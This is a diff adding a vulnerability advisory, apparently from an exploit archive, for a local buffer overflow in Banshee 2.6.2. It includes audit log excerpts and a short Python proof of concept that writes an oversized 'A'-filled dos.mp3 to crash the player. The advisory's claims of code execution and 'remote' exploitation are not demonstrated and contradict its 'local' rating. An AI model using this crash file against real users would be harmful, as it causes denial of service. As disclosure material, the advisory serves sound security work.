@@ -1,0 +1,172 @@
+'''
+Title:
+====
+
+Banshee 2.6.2 Local Buffer Overflow Vulnerability
+
+
+Credit:
+======
+Name: Ilca Lucian
+Contact: lucianfilca@gmail.com
+lucian@pwnthecode.org
+
+
+CVE:
+=====
+
+Unknown (for moment)
+
+
+Product:
+=======
+
+
+Play your music and videos. Keep up with your podcasts and Internet radio.
+Discover new music and podcasts. Keep your portable device loaded with good
+stuff.
+
+Simple enough to enjoy. Powerful enough to thrill. Open source through and
+through.
+
+Product link: http://www.banshee.fm
+
+
+Abstract:
+=======
+
+Lucian I. discovered a Local Buffer Overflow vulnerability in Banshee
+Player 2.6.2 .
+
+
+Affected Version:
+=============
+
+Ver 2.6.2
+
+
+Date:
+============
+19.06.2016
+
+
+Exploitation-Technique:
+===================
+
+Local
+
+
+Severity Rating:
+===================
+
+4.4
+
+
+Details:
+=======
+Vulnerability Description : Banshee Media Player is vulnerable to buffer
+overflow vulnerability.The software performs operations on a memory buffer,
+but it can read from or write to a memory location that is outside of the
+intended boundary of the buffer.Certain languages allow direct addressing
+of memory locations and do not automatically ensure that these locations
+are valid for the memory buffer that is being referenced. This can cause
+read or write operations to be performed on memory locations that may be
+associated with other variables, data structures, or internal program data.
+
+Impact : Banshee 2.6.2 is prone to a local buffer-overflow vulnerability
+because the application fails to perform adequate boundary checks on
+user-supplied input. Specifically, this issue occurs when opening a '.mp3'
+playlist file that contains excessive data.
+
+Attackers may leverage this issue to execute remote buffer overflow or
+inject arbitrary code in the context of the application. Failed attacks
+will cause denial-of-service conditions.
+
+Path Log:
+
+type=PATH msg=audit(1466452858.351:14): item=0 name="/usr/bin/banshee"
+inode=17568145 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
+nametype=NORMAL
+type=PROCTITLE msg=audit(1466452858.351:14):
+proctitle=64656275676673002F7573722F62696E2F62616E73686565
+type=SYSCALL msg=audit(1466452858.351:15): arch=c000003e syscall=2
+success=yes exit=3 a0=7fffd6ed664f a1=80000 a2=ffffffff a3=ca items=1
+ppid=16021 pid=9458 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0
+egid=0 sgid=0 fsgid=0 tty=pts0 ses=4294967295 comm="debugfs"
+exe="/sbin/debugfs" key=(null)
+type=CWD msg=audit(1466452858.351:15):  cwd="/root/Downloads"
+type=PATH msg=audit(1466452858.351:15): item=0 name="/usr/bin/banshee"
+inode=17568145 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
+nametype=NORMAL
+type=PROCTITLE msg=audit(1466452858.351:15):
+proctitle=64656275676673002F7573722F62696E2F62616E73686565
+type=SYSCALL msg=audit(1466453064.143:16): arch=c000003e syscall=59
+success=yes exit=0 a0=126cb9f4 a1=adb4f30 a2=12b5d0c0 a3=593 items=3 ppid=1
+pid=9559 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0
+tty=tty2 ses=1 comm="banshee" exe="/usr/bin/env" key=(null)
+type=EXECVE msg=audit(1466453064.143:16): argc=5 a0="/usr/bin/env"
+a1="bash" a2="/usr/bin/banshee" a3="--redirect-log" a4="--play-enqueued"
+type=CWD msg=audit(1466453064.143:16):  cwd="/root"
+type=PATH msg=audit(1466453064.143:16): item=0 name="/usr/bin/banshee"
+inode=17568145 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
+nametype=NORMAL
+type=PATH msg=audit(1466453064.143:16): item=1 name="/usr/bin/env"
+inode=17567018 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
+nametype=NORMAL
+type=PATH msg=audit(1466453064.143:16): item=2
+name="/lib64/ld-linux-x86-64.so.2" inode=9047695 dev=08:01 mode=0100755
+ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1466453064.143:16):
+proctitle=2F7573722F62696E2F656E760062617368002F7573722F62696E2F62616E73686565002D2D72656469726563742D6C6F67002D2D706C61792D656E717565756564
+type=SYSCALL msg=audit(1466453064.159:17): arch=c000003e syscall=2
+success=yes exit=3 a0=16b4268 a1=0 a2=0 a3=8 items=1 ppid=1 pid=9559 auid=0
+uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty2 ses=1
+comm="bash" exe="/bin/bash" key=(null)
+type=CWD msg=audit(1466453064.159:17):  cwd="/root"
+
+
+
+Error report image link :
+
+https://postimg.org/image/x0x8raw2v/
+
+
+Prerequisites:
+======================
+
+The attacker needs to entice victims to perform an action in order to
+exploit this vulnerability.
+
+
+Proof Of Concept:
+================
+
+
+POC Exploit code:
+'''
+
+#!/usr/bin/python
+
+A = "\x41"
+
+p0c = 'A' * 7550
+
+generate = "dos.mp3"
+file = open(generate , "w")
+file.write(p0c)
+file.close()
+
+
+'''
+Risk:
+=====
+
+The security risk of the Local Buffer Overflow Vulnerability is estimated
+as moderate.
+
+
+Credits:
+=======
+
+Lucian Ilca
+'''
